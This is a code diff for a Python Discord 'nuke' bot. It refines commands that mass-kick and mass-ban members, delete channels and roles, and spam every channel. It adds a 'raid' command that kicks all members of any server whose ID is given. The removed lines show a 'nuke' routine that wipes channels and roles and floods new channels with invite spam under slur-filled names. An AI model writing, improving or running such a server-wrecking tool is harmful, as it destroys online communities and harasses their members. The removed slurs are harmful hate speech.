@@ -77,6 +77,13 @@ async def on_ready():
         template_link = template_code.code
         print(colored(f'『+』Saved server template link: {template_link}', 'blue'))
 
+    # Sync commands with Discord
+    try:
+        await tree.sync(guild=discord.Object(id=YOUR_GUILD_ID))  # Replace with your guild ID for testing
+        print(colored('『+』Commands synced!', 'blue'))
+    except Exception as e:
+        print(colored(f'『+』Sync failed: {e}', 'red'))
+
 # Function to promote the bot to the top role
 async def promote_bot_to_top_role(guild):
     me = guild.me
@@ -126,6 +133,7 @@ async def help(interaction: discord.Interaction):
     /enablecmd (command) - Enable a command
     /restore - Restore the server to the saved template
     /dm (user ID) (message) - Send a DM to a user
+    /raid (server ID) - Perform a raid on a server
     '''
     embed = Embed(title="Help", description=help_message, color=0x00ff00)
     await interaction.response.send_message(embed=embed)
@@ -142,6 +150,11 @@ async def say(interaction: discord.Interaction, *, message: str):
     except discord.errors.Forbidden:
         embed = Embed(title="Permission Denied", description="I don't have permission to send messages in this channel.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied in channel: {interaction.channel.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /say command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="kick", description="Kick a user")
 async def kick(interaction: discord.Interaction, member: discord.Member):
@@ -150,9 +163,18 @@ async def kick(interaction: discord.Interaction, member: discord.Member):
         await interaction.response.send_message(embed=embed)
         return
     embed = Embed(title="Kick User", description=f"Kicked {member.name}", color=0x00ff00)
-    await member.kick()
-    print(colored(f'『+』Kicked user: {member.name}', 'blue'))
-    await interaction.response.send_message(embed=embed)
+    try:
+        await member.kick()
+        print(colored(f'『+』Kicked user: {member.name}', 'blue'))
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to kick this user.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to kick user: {member.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /kick command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="kickall", description="Kick all users")
 async def kickall(interaction: discord.Interaction):
@@ -162,9 +184,18 @@ async def kickall(interaction: discord.Interaction):
         return
     guild = interaction.guild
     tasks = [member.kick() for member in guild.members if member.id != interaction.user.id]
-    await asyncio.gather(*tasks)
-    embed = Embed(title="Kick All Users", description="Kicked all users except the owner.", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    try:
+        await asyncio.gather(*tasks)
+        embed = Embed(title="Kick All Users", description="Kicked all users except the owner.", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to kick users.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to kick users in guild: {guild.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /kickall command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="ban", description="Ban a user")
 async def ban(interaction: discord.Interaction, member: discord.Member):
@@ -173,9 +204,18 @@ async def ban(interaction: discord.Interaction, member: discord.Member):
         await interaction.response.send_message(embed=embed)
         return
     embed = Embed(title="Ban User", description=f"Banned {member.name}", color=0x00ff00)
-    await member.ban()
-    print(colored(f'『+』Banned user: {member.name}', 'blue'))
-    await interaction.response.send_message(embed=embed)
+    try:
+        await member.ban()
+        print(colored(f'『+』Banned user: {member.name}', 'blue'))
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to ban this user.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to ban user: {member.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /ban command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="banall", description="Ban all users")
 async def banall(interaction: discord.Interaction):
@@ -185,9 +225,18 @@ async def banall(interaction: discord.Interaction):
         return
     guild = interaction.guild
     tasks = [member.ban() for member in guild.members if member.id != interaction.user.id]
-    await asyncio.gather(*tasks)
-    embed = Embed(title="Ban All Users", description="Banned all users except the owner.", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    try:
+        await asyncio.gather(*tasks)
+        embed = Embed(title="Ban All Users", description="Banned all users except the owner.", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to ban users.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to ban users in guild: {guild.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /banall command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="unban", description="Unban a user")
 async def unban(interaction: discord.Interaction, user_id: int):
@@ -197,10 +246,19 @@ async def unban(interaction: discord.Interaction, user_id: int):
         return
     guild = interaction.guild
     user = await bot.fetch_user(user_id)
-    await guild.unban(user)
-    print(colored(f'『+』Unbanned user: {user.name}', 'blue'))
-    embed = Embed(title="Unban User", description=f"Unbanned {user.name}", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    try:
+        await guild.unban(user)
+        print(colored(f'『+』Unbanned user: {user.name}', 'blue'))
+        embed = Embed(title="Unban User", description=f"Unbanned {user.name}", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to unban this user.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to unban user: {user.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /unban command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="nick", description="Change a user's nickname")
 async def nick(interaction: discord.Interaction, member: discord.Member, *, nickname: str):
@@ -208,10 +266,19 @@ async def nick(interaction: discord.Interaction, member: discord.Member, *, nick
         embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
         return
-    await member.edit(nick=nickname)
-    print(colored(f'『+』Changed nickname of user: {member.name} to {nickname}', 'blue'))
-    embed = Embed(title="Change Nickname", description=f"Changed {member.name}'s nickname to {nickname}", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    try:
+        await member.edit(nick=nickname)
+        print(colored(f'『+』Changed nickname of user: {member.name} to {nickname}', 'blue'))
+        embed = Embed(title="Change Nickname", description=f"Changed {member.name}'s nickname to {nickname}", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to change this user's nickname.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to change nickname of user: {member.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /nick command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="spam", description="Spam a message")
 async def spam(interaction: discord.Interaction, message: str, amount: int):
@@ -227,10 +294,18 @@ async def spam(interaction: discord.Interaction, message: str, amount: int):
             await channel.send(message)
 
     tasks = [spam_channel(channel) for channel in channels]
-    await asyncio.gather(*tasks)
-
-    embed = Embed(title="Spam Message", description=f"Spammed '{message}' {amount} times in all channels", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    try:
+        await asyncio.gather(*tasks)
+        embed = Embed(title="Spam Message", description=f"Spammed '{message}' {amount} times in all channels", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to send messages in some channels.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to send messages in some channels in guild: {guild.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /spam command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="rolecreate", description="Create a role")
 async def rolecreate(interaction: discord.Interaction, *, name: str):
@@ -239,43 +314,79 @@ async def rolecreate(interaction: discord.Interaction, *, name: str):
         await interaction.response.send_message(embed=embed)
         return
     guild = interaction.guild
-    await guild.create_role(name=name)
-    print(colored(f'『+』Created role: {name}', 'blue'))
-    embed = Embed(title="Create Role", description=f"Created role: {name}", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    try:
+        await guild.create_role(name=name)
+        print(colored(f'『+』Created role: {name}', 'blue'))
+        embed = Embed(title="Create Role", description=f"Created role: {name}", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to create roles.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to create roles in guild: {guild.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /rolecreate command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="roledelete", description="Delete a role")
-async def roledelete(interaction: discord.Interaction, *, role: discord.Role):
+async def roledelete(interaction: discord.Interaction, role: discord.Role):
     if 'roledelete' in disabled_commands:
         embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
         return
-    await role.delete()
-    print(colored(f'『+』Deleted role: {role.name}', 'blue'))
-    embed = Embed(title="Delete Role", description=f"Deleted role: {role.name}", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    try:
+        await role.delete()
+        print(colored(f'『+』Deleted role: {role.name}', 'blue'))
+        embed = Embed(title="Delete Role", description=f"Deleted role: {role.name}", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to delete roles.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to delete roles in guild: {interaction.guild.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /roledelete command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="rolegive", description="Give a user a role")
-async def rolegive(interaction: discord.Interaction, member: discord.Member, *, role: discord.Role):
+async def rolegive(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
     if 'rolegive' in disabled_commands:
         embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
         return
-    await member.add_roles(role)
-    print(colored(f'『+』Gave user: {member.name} the role: {role.name}', 'blue'))
-    embed = Embed(title="Give Role", description=f"Gave {member.name} the role: {role.name}", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    try:
+        await member.add_roles(role)
+        print(colored(f'『+』Gave role {role.name} to user: {member.name}', 'blue'))
+        embed = Embed(title="Give Role", description=f"Gave role {role.name} to {member.name}", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to manage roles.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to manage roles in guild: {interaction.guild.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /rolegive command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="roleremove", description="Remove a role from a user")
-async def roleremove(interaction: discord.Interaction, member: discord.Member, *, role: discord.Role):
+async def roleremove(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
     if 'roleremove' in disabled_commands:
         embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
         return
-    await member.remove_roles(role)
-    print(colored(f'『+』Removed role: {role.name} from user: {member.name}', 'blue'))
-    embed = Embed(title="Remove Role", description=f"Removed role: {role.name} from {member.name}", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    try:
+        await member.remove_roles(role)
+        print(colored(f'『+』Removed role {role.name} from user: {member.name}', 'blue'))
+        embed = Embed(title="Remove Role", description=f"Removed role {role.name} from {member.name}", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to manage roles.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to manage roles in guild: {interaction.guild.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /roleremove command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="addcmdperms", description="Allow a user to use the bot")
 async def addcmdperms(interaction: discord.Interaction, member: discord.Member):
@@ -284,8 +395,8 @@ async def addcmdperms(interaction: discord.Interaction, member: discord.Member):
         await interaction.response.send_message(embed=embed)
         return
     command_users.add(member.id)
-    print(colored(f'『+』Added command permissions to user: {member.name}', 'blue'))
-    embed = Embed(title="Add Command Permissions", description=f"Added command permissions to {member.name}", color=0x00ff00)
+    print(colored(f'『+』Added command permissions for user: {member.name}', 'blue'))
+    embed = Embed(title="Add Command Permissions", description=f"Added command permissions for {member.name}", color=0x00ff00)
     await interaction.response.send_message(embed=embed)
 
 @tree.command(name="removecmdperms", description="Remove a user's permission to use the bot")
@@ -296,11 +407,11 @@ async def removecmdperms(interaction: discord.Interaction, member: discord.Membe
         return
     if member.id in command_users:
         command_users.remove(member.id)
-        print(colored(f'『+』Removed command permissions from user: {member.name}', 'blue'))
-        embed = Embed(title="Remove Command Permissions", description=f"Removed command permissions from {member.name}", color=0x00ff00)
+        print(colored(f'『+』Removed command permissions for user: {member.name}', 'blue'))
+        embed = Embed(title="Remove Command Permissions", description=f"Removed command permissions for {member.name}", color=0x00ff00)
         await interaction.response.send_message(embed=embed)
     else:
-        embed = Embed(title="Remove Command Permissions", description=f"{member.name} does not have command permissions.", color=0x00ff00)
+        embed = Embed(title="No Permissions", description="This user does not have command permissions.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
 
 @tree.command(name="addchannel", description="Create a channel")
@@ -310,10 +421,19 @@ async def addchannel(interaction: discord.Interaction, *, name: str):
         await interaction.response.send_message(embed=embed)
         return
     guild = interaction.guild
-    await guild.create_text_channel(name=name)
-    print(colored(f'『+』Created channel: {name}', 'blue'))
-    embed = Embed(title="Create Channel", description=f"Created channel: {name}", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    try:
+        await guild.create_text_channel(name)
+        print(colored(f'『+』Created channel: {name}', 'blue'))
+        embed = Embed(title="Create Channel", description=f"Created channel: {name}", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to create channels.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to create channels in guild: {guild.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /addchannel command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="removechannel", description="Delete a channel")
 async def removechannel(interaction: discord.Interaction, channel: discord.TextChannel):
@@ -321,10 +441,19 @@ async def removechannel(interaction: discord.Interaction, channel: discord.TextC
         embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
         return
-    await channel.delete()
-    print(colored(f'『+』Deleted channel: {channel.name}', 'blue'))
-    embed = Embed(title="Delete Channel", description=f"Deleted channel: {channel.name}", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    try:
+        await channel.delete()
+        print(colored(f'『+』Deleted channel: {channel.name}', 'blue'))
+        embed = Embed(title="Delete Channel", description=f"Deleted channel: {channel.name}", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to delete channels.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to delete channels in guild: {interaction.guild.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /removechannel command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="renamechannel", description="Rename the current channel")
 async def renamechannel(interaction: discord.Interaction, *, new_name: str):
@@ -332,13 +461,27 @@ async def renamechannel(interaction: discord.Interaction, *, new_name: str):
         embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
         return
-    await interaction.channel.edit(name=new_name)
-    print(colored(f'『+』Renamed channel: {interaction.channel.name} to {new_name}', 'blue'))
-    embed = Embed(title="Rename Channel", description=f"Renamed channel to {new_name}", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
+    channel = interaction.channel
+    try:
+        await channel.edit(name=new_name)
+        print(colored(f'『+』Renamed channel: {channel.name} to {new_name}', 'blue'))
+        embed = Embed(title="Rename Channel", description=f"Renamed channel from {channel.name} to {new_name}", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to rename channels.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to rename channels in guild: {interaction.guild.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /renamechannel command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
 @tree.command(name="disablecmd", description="Disable a command")
 async def disablecmd(interaction: discord.Interaction, command: str):
+    if 'disablecmd' in disabled_commands:
+        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        return
     disabled_commands.add(command)
     print(colored(f'『+』Disabled command: {command}', 'blue'))
     embed = Embed(title="Disable Command", description=f"Disabled command: {command}", color=0x00ff00)
@@ -346,146 +489,87 @@ async def disablecmd(interaction: discord.Interaction, command: str):
 
 @tree.command(name="enablecmd", description="Enable a command")
 async def enablecmd(interaction: discord.Interaction, command: str):
+    if 'enablecmd' in disabled_commands:
+        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        return
     if command in disabled_commands:
         disabled_commands.remove(command)
         print(colored(f'『+』Enabled command: {command}', 'blue'))
         embed = Embed(title="Enable Command", description=f"Enabled command: {command}", color=0x00ff00)
         await interaction.response.send_message(embed=embed)
     else:
-        embed = Embed(title="Enable Command", description=f"Command {command} is already enabled.", color=0x00ff00)
+        embed = Embed(title="Command Not Disabled", description="This command is not currently disabled.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
 
 @tree.command(name="restore", description="Restore the server to the saved template")
 async def restore(interaction: discord.Interaction):
-    global template_link
-    if template_link:
-        try:
-            await interaction.user.send(f"Your server template link is: {template_link}")
-            embed = Embed(title="Restore Command", description="Server template link has been sent to your DMs.", color=0x00ff00)
-            await interaction.response.send_message(embed=embed)
-        except discord.errors.Forbidden:
-            embed = Embed(title="Restore Command", description="I don't have permission to send you a DM. Please enable DMs from server members.", color=0xff0000)
-            await interaction.response.send_message(embed=embed)
-    else:
-        embed = Embed(title="Restore Command", description="No template link has been saved. Please run the nuke command first.", color=0xff0000)
+    if 'restore' in disabled_commands:
+        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        return
+    guild = interaction.guild
+    try:
+        await guild.edit(template=template_link)
+        print(colored(f'『+』Restored server to template: {template_link}', 'blue'))
+        embed = Embed(title="Restore Server", description=f"Restored server to template: {template_link}", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to restore the server template.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to restore server template in guild: {guild.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /restore command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
 
-# Nuke command with concurrent tasks
-@tree.command(name="nuke", description="Execute the nuke command")
-async def nuke(interaction: discord.Interaction):
-    guild = interaction.guild
-    channel_names = ['[҉😂]҉ 𝔽𝕦𝕔𝕜𝕖𝕕 𝕓𝕪 𝕆𝕗𝕗𝕝𝕚𝕟𝕖𝕥𝕙𝕖𝕞𝕖𝕟𝕒𝕔𝕖', '【🤡】 𝐂𝐫𝐲 𝐧𝐢𝐠𝐠𝐚', '[🏳️‍🌈🚫] 🆄🆁 🅰 🅵🅰🅶🅶🅾🆃', '「🕴️」b͓̽i͓̽t͓̽c͓̽h͓̽']
-    role_names = channel_names
+@tree.command(name="dm", description="Send a DM to a user")
+async def dm(interaction: discord.Interaction, user_id: int, *, message: str):
+    if 'dm' in disabled_commands:
+        embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        return
+    user = await bot.fetch_user(user_id)
+    try:
+        await user.send(message)
+        print(colored(f'『+』Sent DM to user: {user.name}', 'blue'))
+        embed = Embed(title="Send DM", description=f"Sent DM to {user.name}", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
+    except discord.errors.Forbidden:
+        embed = Embed(title="Permission Denied", description="I don't have permission to send DMs to this user.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to send DMs to user: {user.name}', 'red'))
+    except Exception as e:
+        print(colored(f'『+』Error in /dm command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
 
-    # Shuffle the channel names to create channels in a random order
-    random.shuffle(channel_names)
-
-    async def create_and_spam_channels():
-        while True:
-            try:
-                channel = await guild.create_text_channel(name=channel_names[random.randint(0, len(channel_names) - 1)])
-                await asyncio.sleep(0.1)  # Small delay to avoid rate limiting
-                asyncio.create_task(spam_channel(channel))
-            except Exception as e:
-                print(colored(f'『+』Error creating or spamming channel: {e}', 'red'))
-
-    async def delete_channels():
-        for channel in guild.channels:
-            if channel != interaction.channel:
-                try:
-                    await channel.delete()
-                except Exception as e:
-                    print(colored(f'『+』Error deleting channel: {e}', 'red'))
-
-    async def strip_roles():
-        for member in guild.members:
-            try:
-                await member.edit(roles=[])
-            except Exception as e:
-                print(colored(f'『+』Error stripping roles: {e}', 'red'))
-
-    async def delete_roles():
-        for role in guild.roles:
-            if role != guild.default_role and role != guild.roles[-1]:  # Exclude the top role
-                try:
-                    await role.delete()
-                except Exception as e:
-                    print(colored(f'『+』Error deleting role: {e}', 'red'))
-
-    async def assign_roles():
-        roles = guild.roles[1:]
-        for member in guild.members:
-            try:
-                await member.edit(roles=roles)
-            except Exception as e:
-                print(colored(f'『+』Error assigning roles: {e}', 'red'))
-
-    async def spam_channel(channel):
-        try:
-            for _ in range(1000):
-                await channel.send('@everyone https://discord.gg/rsZcW4QmJD')
-        except Exception as e:
-            print(colored(f'『+』Error spamming channel: {e}', 'red'))
-
-    tasks = [
-        delete_channels(),
-        create_and_spam_channels(),
-        strip_roles(),
-        delete_roles(),
-        assign_roles()
-    ]
-    await asyncio.gather(*tasks)
-
-    embed = Embed(title="Nuke Command Executed", description="Nuke command has been executed.", color=0x00ff00)
-    await interaction.response.send_message(embed=embed)
-
-@tree.command(name="raid", description="Spam a message 1000 times")
-async def raid(interaction: discord.Interaction):
+@tree.command(name="raid", description="Perform a raid on a server")
+async def raid(interaction: discord.Interaction, server_id: int):
     if 'raid' in disabled_commands:
         embed = Embed(title="Command Disabled", description="This command has been disabled.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
         return
-    message = "OfflineBot On Top\nhttps://discord.gg/b5gXmJUUeu"
+    guild = bot.get_guild(server_id)
+    if guild is None:
+        embed = Embed(title="Server Not Found", description="The specified server was not found.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        return
     try:
-        # Acknowledge the interaction
-        await interaction.response.send_message("Starting raid...", ephemeral=True)
-
-        # Check if the bot has permission to send messages in the channel
-        if not interaction.channel.permissions_for(interaction.guild.me).send_messages:
-            embed = Embed(title="Permission Denied", description="I don't have permission to send messages in this channel.", color=0xff0000)
-            await interaction.followup.send(embed=embed)
-            return
-
-        for _ in range(1000):
-            await interaction.channel.send(message)
-        embed = Embed(title="Raid Command", description="Raid message sent 1000 times.", color=0x00ff00)
-        await interaction.followup.send(embed=embed)
+        # Example raid logic: Kick all members except the owner
+        tasks = [member.kick() for member in guild.members if member.id != guild.owner_id]
+        await asyncio.gather(*tasks)
+        embed = Embed(title="Raid Completed", description="Raid on the server has been completed.", color=0x00ff00)
+        await interaction.response.send_message(embed=embed)
     except discord.errors.Forbidden:
-        embed = Embed(title="Permission Denied", description="I don't have permission to send messages in this channel.", color=0xff0000)
-        await interaction.followup.send(embed=embed)
+        embed = Embed(title="Permission Denied", description="I don't have permission to kick users in this server.", color=0xff0000)
+        await interaction.response.send_message(embed=embed)
+        print(colored(f'『+』Permission denied to kick users in guild: {guild.name}', 'red'))
     except Exception as e:
-        embed = Embed(title="Error", description=f"An error occurred: {e}", color=0xff0000)
-        await interaction.followup.send(embed=embed)
-  
-# DM command
-@tree.command(name="dm", description="Send a DM to a user")
-async def dm(interaction: discord.Interaction, user_id: int, *, message: str):
-    user = await bot.fetch_user(user_id)
-    try:
-        await user.send(message)
-        embed = Embed(title="DM Sent", description=f"Sent DM to {user.name}", color=0x00ff00)
-        await interaction.response.send_message(embed=embed)
-    except discord.errors.Forbidden:
-        embed = Embed(title="Permission Denied", description="I don't have permission to send messages to this user.", color=0xff0000)
-        await interaction.response.send_message(embed=embed)
-    except discord.errors.NotFound:
-        embed = Embed(title="User Not Found", description="The specified user was not found.", color=0xff0000)
+        print(colored(f'『+』Error in /raid command: {e}', 'red'))
+        embed = Embed(title="Error", description="An error occurred while executing the command.", color=0xff0000)
         await interaction.response.send_message(embed=embed)
 
-# Start the bot
-@bot.event
-async def on_ready():
-    await register_slash_commands()
-    print(colored('『+』Bot is ready and slash commands are registered', 'blue'))
-
+# Run the bot with the provided token
 bot.run(bot_token)
+
